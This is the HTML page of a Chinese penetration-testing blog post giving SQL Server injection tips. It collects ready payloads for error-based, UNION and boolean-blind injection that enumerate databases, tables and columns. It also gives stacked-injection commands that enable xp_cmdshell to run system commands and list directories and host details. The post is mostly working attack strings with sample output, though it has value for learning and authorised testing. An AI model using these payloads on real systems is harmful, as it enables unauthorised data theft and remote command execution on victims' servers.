<!DOCTYPE html>
<html lang="en">
  <head>
  <meta charset="utf-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <meta name="description" content="SQL Server 注入常见的一些注入手法"/>
  <meta name="author" content="Reber"/>
  
    
      <title>SQL注入 tips(SQL Server) | Reber&#39;s Blog</title>
    
  
  <link rel="stylesheet" href="/css/reset.css"/>
  <link rel="stylesheet" href="/css/font.css"/>
  <link rel="stylesheet" href="/css/smigle.css"/>
  
    <link rel="stylesheet" href="/css/monokai-sublime.min.css"/>
  
    <link rel="stylesheet" href="/css/style.css"/>
  
  
    <script src="/js/jquery-3.6.0.min.js"/></script>
  
    <script src="/js/highlight.min.js"/></script>
  
    <script src="/js/style.js"/></script>
  
  <link rel="icon" type="image/img" sizes="16x16" href="/img/logo.png">
  <meta name="msapplication-TileColor" content="#da532c">
  <meta name="theme-color" content="#ffffff">
</head>

  <body>
    <header>
  <div id="brand">
    <a class="icon-link" href="https://wyb0.com/">
      <img
        class="icon"
        src="/img/logo.png"
      />
    </a>
    <div class="text">
      <a href="https://wyb0.com/"><h1>Reber&#39;s Blog</h1></a>
      <h3>只会一点点编程、只会一点点渗透</h3>
    </div>
  </div>
  <nav>
    
      
        
        <a href="/"><b>Home</b></a>
      
         | 
        <a href="/posts/"><b>Posts</b></a>
      
         | 
        <a href="/categories/"><b>Categories</b></a>
      
         | 
        <a href="/tags/"><b>Tags</b></a>
      
         | 
        <a href="/about/"><b>About</b></a>
      
         | 
        <a href="/friends/"><b>Friends</b></a>
      
    
  </nav>
  <hr />
</header>

    <div id="content">
      
  <main>
    <article>
      <h1>SQL注入 tips(SQL Server)</h1>
      
<div class="post-meta">
    <time>2018-09-04</time>
    
    [<a href="/categories/Pentest">Pentest</a>](<a href="/tags/SQL%E6%B3%A8%E5%85%A5">SQL注入</a>)
</div>

      <div>

<h3 id="0x00-基础信息探测">0x00 基础信息探测</h3>

<pre><code class="language-sql">@@VERSION,@@SERVERNAME,@@SERVICENAME;
--Microsoft SQL Server 2008 (RTM) - 10.0.1600.22 (X64) 
--WIN-2008
--MSSQLSERVER

USER,CURRENT_USER,SESSION_USER,SYSTEM_USER;
--dbo
--dbo
--dbo
--sa

USER_NAME(),HOST_NAME(),HOST_ID(),SUSER_NAME();
--dbo
--wyb
--46530
--sa

USER_ID(),USER_SID();
--1
--&lt;01&gt;

ORIGINAL_LOGIN();
--sa
</code></pre>

<h3 id="0x01-union-query-error-based-注入">0x01 UNION query &amp; error-based 注入</h3>

<ul>
<li>判断存在注入</li>
</ul>

<pre><code>and 1=1/and 1=2
</code></pre>

<pre><code class="language-sql">select * from msg where id=1 and 11=(select case when(1=1) then 11 else 2 end);

select * from msg where id=1 and 11=(select case when(1=2) then 11 else 2 end);
</code></pre>

<ul>
<li>判断是否为sa权限</li>
</ul>

<pre><code class="language-sql">select name from msg where id=1 and 1=convert(int,(select is_srvrolemember('sysadmin')));
</code></pre>

<p><img src="/img/post/20180904-105516.png" alt="55" /></p>

<ul>
<li>得到所有数据库名字
<img src="/img/post/20180904-110306.png" alt="75" /></li>
</ul>

<pre><code class="language-sql">--得到数据库名，前6个是系统自带的数据库，所以从第7个开始，dbid依次增加即可得到所有数据库
id=1 and 0&lt;&gt;(select name from master.dbo.sysdatabases where dbid=7);
id=1 and 0&lt;&gt;(select name from master.dbo.sysdatabases where dbid=8);

--通过 not in 依次得到数据库名
id=1 and 0&lt;&gt;(select top 1 name from master.dbo.sysdatabases where dbid&gt;6 and name not in (select top 1 name from master.dbo.sysdatabases where dbid&gt;6))
id=1 and 0&lt;&gt;(select top 1 name from master.dbo.sysdatabases where dbid&gt;6 and name not in (select top 2 name from master.dbo.sysdatabases where dbid&gt;6))
</code></pre>

<p><img src="/img/post/20180904-151240.png" alt="75" /></p>

<ul>
<li>得到数据库test的所有表名（用户创建的表xtype的值是U）
<img src="/img/post/20180904-111912.png" alt="70" /></li>
</ul>

<pre><code class="language-sql">--得到数据库test的第一张表
id=-1 union select top 1 id,name from test.dbo.sysobjects where xtype='U';

--得到数据库test的第二张表方法一
id=-1 union select top 1 id,name from test.dbo.sysobjects where xtype='U' and name not in ('article');
--得到数据库test的第二张表方法二
id=-1 union select top 1 id,name from test.dbo.sysobjects where xtype='U' and name not in (select top 1 name from test.dbo.sysobjects where xtype='U');
</code></pre>

<p><img src="/img/post/20180904-151551.png" alt="80" /></p>

<ul>
<li><p>得到数据库test的表article的所有列名</p>

<ul>
<li><p>可以分两步：先得到article的表id，然后得到列名
<img src="/img/post/20180904-112859.png" alt="60" />
<img src="/img/post/20180904-112938.png" alt="75" /></p></li>

<li><p><f>也可直接一条命令直接得到列信息</f></p>

<pre><code>select id,name from syscolumns where id=(select id from sysobjects where name='msg');
</code></pre></li>
</ul></li>

<li><p>得到数据库test的表article的数据
<img src="/img/post/20180904-113720.png" alt="75" /></p></li>
</ul>

<h3 id="0x02-boolean-based-blind-注入">0x02 boolean-based blind 注入</h3>

<pre><code class="language-sql">?id=1 and substring(db_name(),1,1)='a' --
?id=1 and substring(db_name(),1,1)='b' --
</code></pre>

<pre><code class="language-sql">-- 转换为数字
?id=1 and unicode(substring((select db_name()),1,1))&gt;88 --
?id=1 and ascii(substring((select db_name()),1,1))&gt;88 --
</code></pre>

<pre><code class="language-sql">-- 转换为16进制
id=1 and (select master.dbo.fn_varbintohexstr(CONVERT(varbinary(30),(substring(db_name(),1,1)))) from master..sysdatabases where dbid=1) not in ('0x7400')
</code></pre>

<h3 id="0x03-stacked-注入">0x03 Stacked 注入</h3>

<ul>
<li>执行系统命令</li>
</ul>

<pre><code class="language-bash">#判断xp_cmdshell是否被删除
?id=1 and 1=(select count(*) from master.dbo.sysobjects where xtype = 'x' and name = 'xp_cmdshell');

#开启xp_cmdshell
?id=1;exec sp_configure 'show advanced options',1;reconfigure;exec sp_configure 'xp_cmdshell',1;reconfigure;--

#使用xp_cmdshell执行命令
exec master..xp_cmdshell 'whoami';
</code></pre>

<ul>
<li>文件操作</li>
</ul>

<pre><code>#列目录、文件
exec master..xp_dirtree 'c:\wwwroot',1 #列c:\wwwroot下的文件夹 
exec master..xp_dirtree 'c:\wwwroot',1,1 #列c:\wwwroot下的文件夹和文件

exec master..xp_subdirs 'c:\wwwroot' #列c:\wwwroot下的文件夹

#显示系统可用盘符
exec master..xp_availablemedia
</code></pre>

<ul>
<li>主机、中间件信息</li>
</ul>

<pre><code>#获得MS SQL的版本号
exec master..sp_msgetversion

#列出服务器上所有windows本地用户组
exec master..xp_enumgroups

#得到当前sql server服务器的计算机名称
exec master..xp_getnetname

#服务器安全模式信息
exec master..xp_loginconfig
</code></pre>
</div>
    </article>
  </main>

    </div>
    <footer>
  <hr />
  
    <p id="social">
      Find me around the web:
      
        
        <a href="https://github.com/reber0?_blank">GitHub</a>
      
         • 
        <a href="https://weibo.com/u/5819760166?_blank">Weibo</a>
      
    </p>
  
  <p class="copyright">
    Copyright © 2015-2022
    <a href="https://wyb0.com/"><strong>Reber</strong></a>.

    Built with
    <a href="http://www.gohugo.io/">Hugo</a>,
    based on the theme
    <a href="https://gitlab.com/ian-s-mcb/smigle-hugo-theme">smigle</a>.
  </p>
</footer>

  </body>
</html>
